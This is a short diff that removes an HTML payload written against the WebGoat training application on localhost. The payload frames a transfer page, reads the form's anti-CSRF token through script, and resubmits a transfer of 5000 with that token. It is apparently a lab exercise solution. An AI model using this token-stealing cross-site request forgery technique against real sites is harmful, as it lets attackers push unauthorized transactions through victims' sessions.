@@ -1,8 +1,0 @@
-<iframe id="transferpage" src="http://localhost:8090/WebGoat/attack?Screen=1469770765&menu=900&transfer=main" onload="postconfirm()"></iframe>
-<script>
-function postconfirm() {
-	var token = document.getElementById('transferpage').contentDocument.getElementsByName('form')[0].token.value;
-	document.getElementById('transferpage').src = "http://localhost:8090/WebGoat/attack?Screen=1469770765&menu=900&transfer=5000&token="+token;	
-	document.getElementById('transferpage').onload="";
-}
-</script>
